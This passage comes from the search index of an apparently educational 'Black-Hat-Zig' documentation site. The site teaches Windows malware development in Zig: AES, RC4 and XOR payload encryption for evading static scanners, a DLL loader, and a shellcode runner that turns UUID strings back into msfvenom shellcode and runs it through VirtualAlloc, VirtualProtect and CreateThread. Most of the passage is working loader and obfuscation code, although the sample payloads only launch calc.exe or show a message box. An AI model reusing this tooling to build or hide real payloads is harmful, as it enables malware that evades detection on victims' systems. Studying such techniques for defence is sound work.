&amp;p_iv);\n\n    // Variables for padded buffer\n    var padded_buffer: ?[*]u8 = null;\n    var padded_size: SIZE_T = 0;\n\n    // Check if padding is required\n    if (data.len % 16 != 0) {\n        if (padBuffer(&amp;data, data.len, &amp;padded_buffer, &amp;padded_size) == TRUE) {\n            // Encrypt the padded buffer\n            c.AES_CBC_encrypt_buffer(&amp;ctx, padded_buffer.?, @intCast(padded_size));\n            // Print encrypted buffer\n            printHexData(\"CipherText\", padded_buffer.?, padded_size);\n        }\n    } else {\n        // No padding required, encrypt data directly\n        c.AES_CBC_encrypt_buffer(&amp;ctx, &amp;data, @intCast(data.len));\n        printHexData(\"CipherText\", &amp;data, data.len);\n    }\n\n    // Free padded buffer if allocated\n    if (padded_buffer != null) {\n        _ = kernel32.HeapFree(kernel32.GetProcessHeap().?, 0, padded_buffer.?);\n    }\n}\n</code></pre>"},{"location":"Basic-Payload-Management/Payload-Encryption/AES/#decryption_1","title":"Decryption","text":"main.zig<pre><code>// Decryption example (equivalent to second C program)\nfn aesDecrypt() void {\n    print(\"=== DECRYPTION EXAMPLE ===\\n\\n\", .{});\n\n    // Key\n    const p_key = [_]u8{ 0xFD, 0x73, 0x3E, 0x2F, 0x9D, 0x1A, 0x5E, 0x17, 0x4A, 0xD4, 0x8A, 0x14, 0x9E, 0xE6, 0x99, 0x0C, 0x5E, 0x88, 0xCC, 0x92, 0xB4, 0x7E, 0x88, 0x9D, 0x03, 0x47, 0x60, 0x1A, 0x2F, 0xF6, 0xDB, 0x22 };\n    // IV\n    const p_iv = [_]u8{ 0x57, 0x0C, 0x92, 0xE0, 0xE0, 0xB9, 0x52, 0x1A, 0xE7, 0x70, 0x6A, 0xE8, 0x61, 0xF3, 0xB0, 0x52 };\n    // Encrypted data (multiples of 16 bytes)\n    var cipher_text = [_]u8{ 0xBA, 0x94, 0x8F, 0xDD, 0x42, 0xB0, 0x67, 0xB4, 0x32, 0x05, 0x08, 0x09, 0x13, 0x92, 0x9E, 0x4D, 0xF4, 0xF6, 0x38, 0xA1, 0x9A, 0x07, 0x55, 0x4B, 0xE7, 0xF3, 0x72, 0x86, 0x2D, 0xEB, 0x7E, 0xA8, 0xC7, 0xD2, 0xD6, 0xC9, 0xE5, 0x7A, 0x63, 0x09, 0x64, 0xF1, 0x16, 0xD0, 0xFB, 0x9C, 0x89, 0xFA, 0xBA, 0x45, 0x50, 0xAC, 0xE4, 0x94, 0x64, 0x4F, 0x49, 0x11, 0x31, 0x76, 0x48, 0x6E, 0x2D, 0x03 };\n    // Struct needed for Tiny-AES library\n    var ctx: c.struct_AES_ctx = undefined;\n\n    // Initialize Tiny-AES library\n    c.AES_init_ctx_iv(&amp;ctx, &amp;p_key, &amp;p_iv);\n\n    print(\"Original key:\\n\", .{});\n    printHexData(\"pKey\", &amp;p_key, p_key.len);\n    print(\"Original IV:\\n\", .{});\n    printHexData(\"pIv\", &amp;p_iv, p_iv.len);\n    print(\"Original ciphertext:\\n\", .{});\n    printHexData(\"CipherText\", &amp;cipher_text, cipher_text.len);\n\n    // Decrypt\n    c.AES_CBC_decrypt_buffer(&amp;ctx, &amp;cipher_text, @intCast(cipher_text.len));\n\n    // Print decrypted buffer\n    print(\"Decrypted data:\\n\", .{});\n    printHexData(\"PlainText\", &amp;cipher_text, cipher_text.len);\n\n    // Print as string (find null terminator or use full length)\n    var str_len: usize = 0;\n    for (cipher_text, 0..) |byte, i| {\n        if (byte == 0) {\n            str_len = i;\n            break;\n        }\n    }\n    if (str_len == 0) str_len = cipher_text.len;\n\n    print(\"Data: {s}\\n\", .{cipher_text[0..str_len]});\n}\n</code></pre>"},{"location":"Basic-Payload-Management/Payload-Encryption/RC4/","title":"RC4 Encryption","text":""},{"location":"Basic-Payload-Management/Payload-Encryption/RC4/#tldr","title":"TL;DR","text":"<p>See the code example</p> <p>RC4 is a simple stream cipher that remains popular in malicious code because of its small footprint and ease of implementation. In Windows, the undocumented functions <code>SystemFunction032</code> and <code>SystemFunction033</code> can perform RC4 encryption. The sample code demonstrates encrypting a payload with one call and decrypting it with another since RC4 is symmetric. Keeping shellcode encrypted until execution helps avoid detection by static scanners that search for known byte patterns.</p>"},{"location":"Basic-Payload-Management/Payload-Encryption/RC4/#using-systemfunction032","title":"Using SystemFunction032","text":"<p>Preparing <code>USTRING</code> struct to represent the key and data buffers. <code>extern</code> is used so that its memory layout matches that of a corresponding C strcuct. main.zig<pre><code>const USTRING = extern struct {\n    Length: DWORD,\n    MaximumLength: DWORD,\n    Buffer: PVOID,\n};\n</code></pre> <code>fnSystemFunction032</code> is a fucntion pointer to <code>SystemFunction032</code> main.zig<pre><code>const fnSystemFunction032 = fn (\n    Data: *USTRING,\n    Key: *USTRING,\n) callconv(.C) NTSTATUS;\n</code></pre></p> <p>Helper function to call <code>SystemFunction032</code> main.zig<pre><code>/// Helper function that calls SystemFunction032 (RC4)\n/// Reference: https://osandamalith.com/2022/11/10/encrypting-shellcode-using-systemfunction032-033/\npub fn rc4EncryptionViaSystemFunc032(\n    rc4Key: []u8,\n    payloadData: []u8,\n) bool {\n    // Prepare the USTRING structs\n    var Data = USTRING{\n        .Buffer = payloadData.ptr,\n        .Length = @intCast(payloadData.len),\n        .MaximumLength = @intCast(payloadData.len),\n    };\n    var Key = USTRING{\n        .Buffer = rc4Key.ptr,\n        .Length = @intCast(rc4Key.len),\n        .MaximumLength = @intCast(rc4Key.len),\n    };\n\n    // Convert \"Advapi32\" to UTF-16LE for LoadLibraryW\n    const advapi32_w = std.unicode.utf8ToUtf16LeStringLiteral(\"Advapi32\");\n    const advapi32 = kernel32.LoadLibraryW(advapi32_w);\n    if (advapi32 == null) {\n        std.debug.print(\"[!] LoadLibraryW failed: {}\\n\", .{kernel32.GetLastError()});\n        return false;\n    }\n    defer _ = kernel32.FreeLibrary(advapi32.?);\n\n    const proc_addr = kernel32.GetProcAddress(advapi32.?, \"SystemFunction032\");\n    if (proc_addr == null) {\n        std.debug.print(\"[!] GetProcAddress failed: {}\\n\", .{kernel32.GetLastError()});\n        return false;\n    }\n\n    const SystemFunction032: *const fnSystemFunction032 = @ptrCast(proc_addr);\n\n    const status: NTSTATUS = SystemFunction032(&amp;Data, &amp;Key);\n\n    if (status != 0) {\n        std.debug.print(\"[!] SystemFunction032 FAILED With Error: 0x{X:0&gt;8}\\n\", .{status});\n        return false;\n    }\n    return true;\n}\n</code></pre> Example usage: main.zig<pre><code>pub fn main() !void {\n    const stdout = std.io.getStdOut().writer();\n\n    // Example RC4 key and payload\n    var key = [_]u8{ 0x11, 0x22, 0x33, 0x44, 0x55 };\n    var data = [_]u8{ 0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED, 0xFA, 0xCE };\n\n    try stdout.print(\"[+] Original payload: {any}\\n\", .{data});\n    try stdout.print(\"[+] RC4 key: {any}\\n\", .{key});\n\n    // Encrypt (in-place)\n    if (!rc4EncryptionViaSystemFunc032(key[0..], data[0..])) {\n        try stdout.print(\"[+] Encryption failed!\\n\", .{});\n        return;\n    }\n    try stdout.print(\"[+] Encrypted payload: {any}\\n\", .{data});\n\n    // Decrypt (RC4 is symmetric, so call again with same key)\n    if (!rc4EncryptionViaSystemFunc032(key[0..], data[0..])) {\n        try stdout.print(\"[+] Decryption failed!\\n\", .{});\n        return;\n    }\n    try stdout.print(\"[+] Decrypted payload: {any}\\n\", .{data});\n}\n</code></pre></p>"},{"location":"Basic-Payload-Management/Payload-Encryption/RC4/#using-systemfunction033","title":"Using SystemFunction033","text":"<p>Preparing the <code>USTRING</code> main.zig<pre><code>const USTRING = extern struct {\n    Length: DWORD,\n    MaximumLength: DWORD,\n    Buffer: PVOID,\n};\n</code></pre></p> <p><code>fnSystemFunction033</code> is the function pointer to <code>SystemFunction032</code>: main.zig<pre><code>const fnSystemFunction033 = fn (\n    Data: *USTRING,\n    Key: *USTRING,\n) callconv(.C) NTSTATUS;\n</code></pre></p> <p>Helper function to call <code>SystemFunction033</code>: main.zig<pre><code>/// Helper function that calls SystemFunction033 (RC4)\n/// Reference: https://osandamalith.com/2022/11/10/encrypting-shellcode-using-systemfunction032-033/\npub fn rc4EncryptionViaSystemFunc033(\n    rc4Key: []u8,\n    payloadData: []u8,\n) bool {\n    // Prepare the USTRING structs\n    var Data = USTRING{\n        .Buffer = payloadData.ptr,\n        .Length = @intCast(payloadData.len),\n        .MaximumLength = @intCast(payloadData.len),\n    };\n    var Key = USTRING{\n        .Buffer = rc4Key.ptr,\n        .Length = @intCast(rc4Key.len),\n        .MaximumLength = @intCast(rc4Key.len),\n    };\n\n    // Convert \"Advapi32\" to UTF-16LE for LoadLibraryW\n    const advapi32_w = std.unicode.utf8ToUtf16LeStringLiteral(\"Advapi32\");\n    const advapi32 = kernel32.LoadLibraryW(advapi32_w);\n    if (advapi32 == null) {\n        std.debug.print(\"[!] LoadLibraryW failed: {}\\n\", .{kernel32.GetLastError()});\n        return false;\n    }\n    defer _ = kernel32.FreeLibrary(advapi32.?);\n\n    const proc_addr = kernel32.GetProcAddress(advapi32.?, \"SystemFunction033\");\n    if (proc_addr == null) {\n        std.debug.print(\"[!] GetProcAddress failed: {}\\n\", .{kernel32.GetLastError()});\n        return false;\n    }\n\n    const SystemFunction033: *const fnSystemFunction033 = @ptrCast(proc_addr);\n\n    const status: NTSTATUS = SystemFunction033(&amp;Data, &amp;Key);\n\n    if (status != 0) {\n        std.debug.print(\"[!] SystemFunction033 FAILED With Error: 0x{X:0&gt;8}\\n\", .{status});\n        return false;\n    }\n    return true;\n}\n</code></pre></p> <p>Example usage: main.zig<pre><code>pub fn main() !void {\n    const stdout = std.io.getStdOut().writer();\n\n    // Example RC4 key and payload\n    var key = [_]u8{ 0x11, 0x22, 0x33, 0x44, 0x55 };\n    var data = [_]u8{ 0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED, 0xFA, 0xCE };\n\n    try stdout.print(\"[+] Original payload: {any}\\n\", .{data});\n    try stdout.print(\"[+] RC4 key: {any}\\n\", .{key});\n\n    // Encrypt (in-place)\n    if (!rc4EncryptionViaSystemFunc033(key[0..], data[0..])) {\n        try stdout.print(\"[+] Encryption failed!\\n\", .{});\n        return;\n    }\n    try stdout.print(\"[+] Encrypted payload: {any}\\n\", .{data});\n\n    // Decrypt (RC4 is symmetric, so call again with same key)\n    if (!rc4EncryptionViaSystemFunc033(key[0..], data[0..])) {\n        try stdout.print(\"[+] Decryption failed!\\n\", .{});\n        return;\n    }\n    try stdout.print(\"[+] Decrypted payload: {any}\\n\", .{data});\n}\n</code></pre></p>"},{"location":"Basic-Payload-Management/Payload-Encryption/XOR/","title":"XOR Encryption","text":""},{"location":"Basic-Payload-Management/Payload-Encryption/XOR/#tldr","title":"TL;DR","text":"<p>See the code example</p> <p>Exclusive OR (XOR) encryption is one of the simplest ways to obfuscate data. Each byte of the payload is XORed with a key value. Applying the same operation again restores the original bytes. While trivial to reverse if the key is known, XOR still hides clear text strings and shellcode from basic scans. The chapter shows two XOR routines\u2014one that incorporates the byte index and another that uses a multi-byte key\u2014to demonstrate how attackers might protect their payloads without resorting to heavy cryptography.</p>"},{"location":"Basic-Payload-Management/Payload-Encryption/XOR/#using-standard-library","title":"Using Standard Library","text":"main.zig<pre><code>const std = @import(\"std\");\n\n/// This is the first approach to encrypt the payload.\n/// We add the index \"i\" to each iteration to make the encryption\n/// more complicated.\nfn xorWithKeyAndIndex(payload: []u8, key: u8) void {\n    for (payload, 0..) |*byte, i| {\n        // Truncate i to u8 (i mod 256), then do wrapping add with key (overflow in the sum),\n        // finally XOR the result with the payload byte.\n        byte.* = byte.* ^ (key +% @as(u8, @truncate(i)));\n    }\n}\n\n/// This is the second approach to encrypt the payload.\n/// We use a multi-bytes key and iterate each byte as different\n/// key in each iteration.\nfn xorWithMultiBytesKey(payload: []u8, key: []const u8) void {\n    const key_len = key.len;\n    if (key_len == 0) @panic(\"Key length must be greater than 0\"); // Division by zero\n\n    var j: usize = 0;\n    for (payload) |*byte| {\n        byte.* = byte.* ^ key[j];\n        j += 1;\n        if (j &gt;= key_len) {\n            j = 0;\n        }\n    }\n}\n\npub fn main() !void {\n    const stdout = std.io.getStdOut().writer();\n\n    var payload1 = [_]u8{ 0x10, 0x20, 0x30, 0x40, 0x50 };\n    const key1: u8 = 0xAA;\n    try stdout.print(\"[+] Original payload1: {any}\\n\", .{payload1});\n    // Encrypt\n    xorWithKeyAndIndex(payload1[0..], key1);\n    try stdout.print(\"[+] After xorByIKeys with key {X}: {any}\\n\", .{ key1, payload1 });\n    // Decrypt\n    xorWithKeyAndIndex(payload1[0..], key1);\n    try stdout.print(\"[+] Restored payload1: {any}\\n\\n\", .{payload1});\n\n    var payload2 = [_]u8{ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06 };\n    const key2 = [_]u8{ 0x10, 0x20, 0x30 };\n    try stdout.print(\"[+] Original payload2: {any}\\n\", .{payload2});\n    // Encrypt\n    xorWithMultiBytesKey(payload2[0..], key2[0..]);\n    try stdout.print(\"[+] After xorByInputKey with key {any}: {any}\\n\", .{ key2, payload2 });\n    // Decrypt\n    xorWithMultiBytesKey(payload2[0..], key2[0..]);\n    try stdout.print(\"[+] Restored payload2: {any}\\n\", .{payload2});\n}\n</code></pre>"},{"location":"Basic-Payload-Management/Payload-Execution/dll/","title":"Execute Via DLL","text":""},{"location":"Basic-Payload-Management/Payload-Execution/dll/#tldr","title":"TL;DR","text":"<p>See the code example</p> <p>Instead of embedding shellcode directly, malware can bundle its functionality in a DLL and rely on a small loader to execute it. The loader locates the DLL at runtime and calls an exported function or uses <code>LoadLibrary</code> to bring it into the process. This approach makes the initial executable less suspicious and allows the payload to be swapped easily. The included example outlines how to compile the DLL and how the loader invokes it using standard Windows API calls.</p>"},{"location":"Basic-Payload-Management/Payload-Execution/dll/#what-is-a-dll","title":"What Is A DLL?","text":"<p>A DLL (Dynamic Link Library) is a file format used primarily in Windows operating systems to store code and data that multiple programs can use simultaneously. It contains functions, resources, or data that can be loaded dynamically at runtime and allows programs to share reusable code without embedding it in each executable.</p>"},{"location":"Basic-Payload-Management/Payload-Execution/dll/#code-walkthrough","title":"Code Walkthrough","text":""},{"location":"Basic-Payload-Management/Payload-Execution/dll/#the-dll-itself","title":"The DLL Itself","text":"root.zig<pre><code>const std = @import(\"std\");\nconst windows = std.os.windows;\n\n// Windows API types\nconst HINSTANCE = windows.HINSTANCE;\nconst DWORD = windows.DWORD;\nconst LPVOID = *anyopaque;\nconst BOOL = windows.BOOL;\n\n// DLL reasons\nconst DLL_PROCESS_ATTACH: DWORD = 1;\nconst DLL_THREAD_ATTACH: DWORD = 2;\nconst DLL_THREAD_DETACH: DWORD = 3;\nconst DLL_PROCESS_DETACH: DWORD = 0;\n\n// MessageBox constants\nconst MB_OK: u32 = 0x00000000;\nconst MB_ICONINFORMATION: u32 = 0x00000040;\n\n// Windows API functions\nextern \"user32\" fn MessageBoxA(\n    hWnd: ?windows.HWND,\n    lpText: [*:0]const u8,\n    lpCaption: [*:0]const u8,\n    uType: u32,\n) callconv(.C) i32;\n\nfn msgBoxPayload() void {\n    _ = MessageBoxA(\n        null,\n        \"Please give Black-Hat-Zig a star!\",\n        \"Malware!\",\n        MB_OK | MB_ICONINFORMATION,\n    );\n}\n\n// DllMain has to be public\npub export fn DllMain(hModule: HINSTANCE, dwReason: DWORD, lpReserved: LPVOID) callconv(.C) BOOL {\n    _ = hModule;\n    _ = lpReserved;\n\n    switch (dwReason) {\n        DLL_PROCESS_ATTACH =&gt; {\n            msgBoxPayload();\n        },\n        DLL_THREAD_ATTACH, DLL_THREAD_DETACH, DLL_PROCESS_DETACH =&gt; {\n            // Do nothing for these cases\n        },\n        else =&gt; {\n            // Handle unexpected values\n        },\n    }\n\n    return 1; // TRUE\n}\n</code></pre> <p><code>DllMain</code> is the entry point for a Windows DLL, it is called when the DLL is loaded or unloaded, or when threads are created/terminated. When <code>dwReason</code> is <code>DLL_PROCESS_ATTACH</code>, <code>msgBoxPayload</code> is called, invoking <code>MessageBoxA</code> to display a pop up.</p>"},{"location":"Basic-Payload-Management/Payload-Execution/dll/#dll-loader","title":"DLL Loader","text":"<p>What we are doing here:</p> <ul> <li>Accepting a DLL file path as a command-line argument:main.zig<pre><code>const args = try std.process.argsAlloc(allocator);\ndefer std.process.argsFree(allocator, args);\n\nif (args.len &lt; 2) {\n    print(\"[!] Missing Argument; Dll Payload To Run \\n\", .{});\n    print(\"Usage: {s} &lt;dll_path&gt;\\n\", .{args[0]});\n    std.process.exit(1);\n}\n\nconst dll_path = args[1];\nconst current_pid = windows.GetCurrentProcessId();\n\nprint(\"[i] Injecting \\\"{s}\\\" To The Local Process Of Pid: {d} \\n\", .{ dll_path, current_pid });\n</code></pre> </li> </ul> <ul> <li>Validating the DLL's existence and resolving its full path:main.zig<pre><code>var full_path_buf: [windows.PATH_MAX_WIDE]u8 = undefined;\nconst full_path = std.fs.cwd().realpath(dll_path, &amp;full_path_buf) catch |err| {\n    print(\"[!] Cannot access DLL file \\\"{s}\\\": {}\\n\", .{ dll_path, err });\n    print(\"[!] Make sure the file exists and is in the current directory\\n\", .{});\n    std.process.exit(1);\n};\n\nprint(\"[+] Full DLL path: {s}\\n\", .{full_path});\nprint(\"[+] Loading Dll... \", .{});\n</code></pre> </li> </ul> <ul> <li>Loading the DLL into the current process using <code>std.DynLib.open</code> and error handling:main.zig<pre><code>var open_lib = std.DynLib.open(dll_path);\nif (open_lib) |*lib| {\n    const handle = lib.inner.dll;\n    print(\"SUCCESS!\\n\", .{});\n    print(\"[+] DLL Handle: 0x{x}\\n\", .{@intFromPtr(handle)});\n\n    // Verify the loaded module\n    var module_name: [windows.MAX_PATH]u8 = undefined;\n    const name_len = GetModuleFileNameA(handle, &amp;module_name, windows.MAX_PATH);\n    if (name_len &gt; 0) {\n        print(\"[+] Loaded module: {s}\\n\", .{module_name[0..name_len]});\n    }\n\n    print(\"[+] DLL loaded successfully! Waiting for payload execution...\\n\", .{});\n\n    // Give the DLL time to execute\n    std.time.sleep(2 * std.time.ns_per_s); // Wait 2 seconds\n\n    // Keep the DLL loaded for a bit longer\n    print(\"[+] Press &lt;Enter&gt; to unload DLL and exit... \", .{});\n    _ = std.io.getStdIn().reader().readByte() catch {};\n\n    // Unload the DLL\n    lib.close();\n    print(\"[+] DLL unloaded successfully\\n\", .{});\n\n    print(\"[+] DONE!\\n\", .{});\n} else |_| {\n    const error_code = windows.GetLastError();\n    print(\"FAILED!\\n\", .{});\n    print(\"[!] LoadLibraryA Failed With Error: {d}\\n\", .{@intFromEnum(error_code)});\n\n    // Print common error meanings\n    switch (error_code) {\n        .FILE_NOT_FOUND =&gt; print(\"    \u2192 The system cannot find the file specified\\n\", .{}),\n        .PATH_NOT_FOUND =&gt; print(\"    \u2192 The system cannot find the path specified\\n\", .{}),\n        .MOD_NOT_FOUND =&gt; print(\"    \u2192 The specified module could not be found\\n\", .{}),\n        .BAD_EXE_FORMAT =&gt; print(\"    \u2192 Not a valid Win32 application\\n\", .{}),\n        else =&gt; print(\"    \u2192 Unknown error\\n\", .{}),\n    }\n    std.process.exit(1);\n}\n</code></pre> </li> </ul> <p>You should add this to your <code>build.zig</code>. You can replace the <code>payload_dll</code> to the name you like.</p> build.zig<pre><code>const payload_dll = b.addSharedLibrary(.{\n    .name = \"payload_dll\",\n    .root_source_file = b.path(\"src/root.zig\"),\n    .target = target,\n    .optimize = optimize,\n});\n\n// Link Windows libraries for the DLL\npayload_dll.linkSystemLibrary(\"kernel32\");\npayload_dll.linkSystemLibrary(\"user32\");\n</code></pre>"},{"location":"Basic-Payload-Management/Payload-Execution/shellcode/","title":"Execute Via Shellcode","text":""},{"location":"Basic-Payload-Management/Payload-Execution/shellcode/#tldr","title":"TL;DR","text":"<p>See the code example</p> <p>Executing payloads as shellcode involves storing the machine code directly in a buffer, allocating executable memory, and then jumping to that buffer. The code here uses the ZYPE tool to generate encrypted shellcode that is decoded at runtime. After calling Windows APIs such as <code>VirtualAlloc</code> and <code>CreateThread</code>, the program transfers control to the shellcode, effectively running the payload without dropping any additional files. This direct execution model is common in many droppers and fileless malware samples.</p>"},{"location":"Basic-Payload-Management/Payload-Execution/shellcode/#what-is-shellcode","title":"What Is Shellcode?","text":"<p>Shellcode is a sequence of machine instructions, that are designed to be injected into a running program to execute a specific payload. It often spawns a shell(<code>cmd.exe</code> or <code>powershell.exe</code> in windows, <code>/bin/sh</code> in linux).</p>"},{"location":"Basic-Payload-Management/Payload-Execution/shellcode/#code-walkthrough","title":"Code Walkthrough","text":"<p>The payload array and deobfuscation function is generated by ZYPE, you should go install that tool if you haven't. That will make generating encrypted/obfuscated payload to be much more easier.</p> <p>Declaring all the constants:</p> main.zig<pre><code>const std = @import(\"std\");\nconst windows = std.os.windows;\nconst print = std.debug.print;\n\n// Windows API types\nconst PVOID = *anyopaque;\nconst DWORD = windows.DWORD;\nconst SIZE_T = usize;\nconst PBYTE = [*]u8;\n\n// Memory protection constants\nconst MEM_COMMIT = 0x1000;\nconst MEM_RESERVE = 0x2000;\nconst PAGE_READWRITE = 0x04;\nconst PAGE_EXECUTE_READWRITE = 0x40;\n\n// Windows API functions\nextern \"kernel32\" fn GetCurrentProcessId() callconv(.C) DWORD;\nextern \"kernel32\" fn GetLastError() callconv(.C) DWORD;\nextern \"kernel32\" fn VirtualAlloc(?PVOID, SIZE_T, DWORD, DWORD) callconv(.C) ?PVOID;\nextern \"kernel32\" fn VirtualProtect(PVOID, SIZE_T, DWORD, *DWORD) callconv(.C) windows.BOOL;\nextern \"kernel32\" fn CreateThread(?windows.HANDLE, SIZE_T, *const fn (?PVOID) callconv(.C) DWORD, ?PVOID, DWORD, ?*DWORD) callconv(.C) ?windows.HANDLE;\nextern \"kernel32\" fn HeapFree(windows.HANDLE, DWORD, PVOID) callconv(.C) windows.BOOL;\nextern \"kernel32\" fn GetProcessHeap() callconv(.C) windows.HANDLE;\n</code></pre> <p>UUID array is generated from the following command (for more information about zype: https://github.com/cx330blake/zype):</p> <pre><code>1. msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o calc.bin\n2. zype -f calc.bin -m uuid\n</code></pre> <p>This generates us 17 UUID strings and are stored in the <code>UUID_ARRAY</code></p> main.zig<pre><code>const UUID_ARRAY: [17][]const u8 = [_][]const u8{\n    \"E48348FC-E8F0-00C0-0000-415141505251\",\n    \"D2314856-4865-528B-6048-8B5218488B52\",\n    \"728B4820-4850-B70F-4A4A-4D31C94831C0\",\n    \"7C613CAC-2C02-4120-C1C9-0D4101C1E2ED\",\n    \"48514152-528B-8B20-423C-4801D08B8088\",\n    \"48000000-C085-6774-4801-D0508B481844\",\n    \"4920408B-D001-56E3-48FF-C9418B348848\",\n    \"314DD601-48C9-C031-AC41-C1C90D4101C1\",\n    \"F175E038-034C-244C-0845-39D175D85844\",\n    \"4924408B-D001-4166-8B0C-48448B401C49\",\n    \"8B41D001-8804-0148-D041-5841585E595A\",\n    \"59415841-5A41-8348-EC20-4152FFE05841\",\n    \"8B485A59-E912-FF57-FFFF-5D48BA010000\",\n    \"00000000-4800-8D8D-0101-000041BA318B\",\n    \"D5FF876F-E0BB-2A1D-0A41-BAA695BD9DFF\",\n    \"C48348D5-3C28-7C06-0A80-FBE07505BB47\",\n    \"6A6F7213-5900-8941-DAFF-D563616C6300\",\n};\n\nconst NUMBER_OF_ELEMENTS: usize = 17;\n</code></pre> <p>Manually parsing the UUID strings such that they match Windows <code>UuidFromStringA</code> behavior (converting each UUID string into a 16-byte binary representation, removing hyphens, correcting endianness)</p> main.zig<pre><code>fn parseUuidManual(uuid_str: []const u8, buffer: []u8) !void {\n    if (buffer.len &lt; 16) return error.BufferTooSmall;\n\n    // UUID format: XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX\n    // Split into parts: [8]-[4]-[4]-[4]-[12] = 32 hex chars + 4 hyphens\n\n    var clean_hex = std.ArrayList(u8).init(std.heap.page_allocator);\n    defer clean_hex.deinit();\n\n    // Remove hyphens to get 32 hex characters\n    for (uuid_str) |c| {\n        if (c != '-') {\n            try clean_hex.append(c);\n        }\n    }\n\n    if (clean_hex.items.len != 32) return error.InvalidUuidLength;\n\n    // Parse UUID components with correct endianness\n    // Windows UUID structure (matches GUID):\n    // - First 4 bytes (data1): Little-endian 32-bit\n    // - Next 2 bytes (data2): Little-endian 16-bit\n    // - Next 2 bytes (data3): Little-endian 16-bit\n    // - Last 8 bytes (data4): Big-endian bytes\n\n    const hex_chars = clean_hex.items;\n\n    // Data1 (4 bytes, little-endian)\n    const data1 = try std.fmt.parseInt(u32, hex_chars[0..8], 16);\n    buffer[0] = @intCast(data1 &amp; 0xFF);\n    buffer[1] = @intCast((data1 &gt;&gt; 8) &amp; 0xFF);\n    buffer[2] = @intCast((data1 &gt;&gt; 16) &amp; 0xFF);\n    buffer[3] = @intCast((data1 &gt;&gt; 24) &amp; 0xFF);\n\n    // Data2 (2 bytes, little-endian)\n    const data2 = try std.fmt.parseInt(u16, hex_chars[8..12], 16);\n    buffer[4] = @intCast(data2 &amp; 0xFF);\n    buffer[5] = @intCast((data2 &gt;&gt; 8) &amp; 0xFF);\n\n    // Data3 (2 bytes, little-endian)\n    const data3 = try std.fmt.parseInt(u16, hex_chars[12..16], 16);\n    buffer[6] = @intCast(data3 &amp; 0xFF);\n    buffer[7] = @intCast((data3 &gt;&gt; 8) &amp; 0xFF);\n\n    // Data4 (8 bytes, big-endian - byte by byte)\n    for (0..8) |i| {\n        const hex_pair = hex_chars[16 + i * 2 .. 16 + i * 2 + 2];\n        buffer[8 + i] = try std.fmt.parseInt(u8, hex_pair, 16);\n    }\n}\n</code></pre> <p>This functions iterates over the UUID array to reconstruct the original shell. It allocates a buffer to hold the deobfuscated payload (17 UUIDs x 16 bytes = 272 bytes)</p> main.zig<pre><code>fn uuidDeobfuscation(uuid_array: []const []const u8, allocator: std.mem.Allocator) ![]u8 {\n    const buffer_size = uuid_array.len * 16;\n    const buffer = try allocator.alloc(u8, buffer_size);\n\n    for (uuid_array, 0..) |uuid_str, i| {\n        const offset = i * 16;\n        parseUuidManual(uuid_str, buffer[offset .. offset + 16]) catch |err| {\n            std.debug.print(\"[!] Failed to parse UUID[{}]: \\\"{s}\\\" - Error: {}\\n\", .{ i, uuid_str, err });\n            allocator.free(buffer);\n            return err;\n        };\n    }\n\n    return buffer;\n}\n</code></pre> <p>Steps to follow in the main fucntion:</p> <ul> <li>Deobfuscating the UUID array into a shellcode buffermain.zig<pre><code>const p_deobfuscated_payload = uuidDeobfuscation(&amp;UUID_ARRAY, allocator) catch |err| {\n    print(\"[!] uuidDeobfuscation Failed With Error: {}\\n\", .{err});\n    std.process.exit(1);\n};\ndefer allocator.free(p_deobfuscated_payload);\n\nprint(\"[+] DONE !\\n\", .{});\n\nconst s_deobfuscated_size = p_deobfuscated_payload.len;\nprint(\"[i] Deobfuscated Payload At : 0x{x} Of Size : {d} \\n\", .{ @intFromPtr(p_deobfuscated_payload.ptr), s_deobfuscated_size });\n\nwaitForEnter(\"[#] Press &lt;Enter&gt; To Allocate ... \");\n</code></pre> </li> </ul> <ul> <li>Allocating memory with <code>VirtualAlloc</code> and copying the deobfuscated shell code to the allocated memorymain.zig<pre><code>const p_shellcode_address = VirtualAlloc(null, s_deobfuscated_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) orelse {\n    print(\"[!] VirtualAlloc Failed With Error : {d} \\n\", .{GetLastError()});\n    std.process.exit(1);\n};\n\nprint(\"[i] Allocated Memory At : 0x{x} \\n\", .{@intFromPtr(p_shellcode_address)});\n\nwaitForEnter(\"[#] Press &lt;Enter&gt; To Write Payload ... \");\n\n// Copy the payload to allocated memory\n@memcpy(@as([*]u8, @ptrCast(p_shellcode_address))[0..s_deobfuscated_size], p_deobfuscated_payload);\n\n// Clear the original payload buffer\n@memset(@as([*]u8, @ptrCast(p_deobfuscated_payload.ptr))[0..s_deobfuscated_size], 0);\n</code></pre> </li> </ul> <ul> <li>Changing memory protection to executable using <code>VirtualProtect</code>main.zig<pre><code>var dw_old_protection: DWORD = 0;\nif (VirtualProtect(p_shellcode_address, s_deobfuscated_size, PAGE_EXECUTE_READWRITE, &amp;dw_old_protection) == 0) {\n    print(\"[!] VirtualProtect Failed With Error : {d} \\n\", .{GetLastError()});\n    std.process.exit(1);\n}\n\nwaitForEnter(\"[#] Press &lt;Enter&gt; To Run ... \");\n</code></pre> </li> </ul> <ul> <li>Creating a new thread to execute shell code using <code>CreateThread</code>main.zig<pre><code>const thread_handle = CreateThread(null, 0, @ptrCast(p_shellcode_address), null, 0, null) orelse {\n    print(\"[!] CreateThread Failed With Error : {d} \\n\", .{GetLastError()});\n    std.process.exit(1);\n};\n\n_ = thread_handle; // Suppress unused variable warning\n\nprint(\"[+] Calculator should launch now!\\n\", .{});\nwaitForEnter(\"[#] Press &lt;Enter&gt; To Quit ... \"); // Pause the execution.\n\nreturn;\n</code></pre> </li> </ul> <p>NOTE: If we don't use <code>waitForEnter()</code> here, the main thread might have high possibility to exit before the shellcode being executed. So here we use that function to pause the execution. In practice, we should use <code>WaitForSingleObject()</code> function from Windows API to wait until the new thread to finish or the thread it timed out. So that the main thread will not exit before the shellcode execution.</p> main.zig<pre><code>// Wait for Enter key by reading entire line\nfn waitForEnter(message: []const u8) void {\n    print(\"{s}\", .{message});\n    var buffer: [256]u8 = undefined;\n    _ = std.io.getStdIn().reader().readUntilDelimiterOrEof(buffer[0..], '\\n') catch {};\n}\n</code></pre>"},{"location":"Basic-Payload-Management/Payload-Obfuscation/IP-Address-Obfuscation/","title":"IP Address 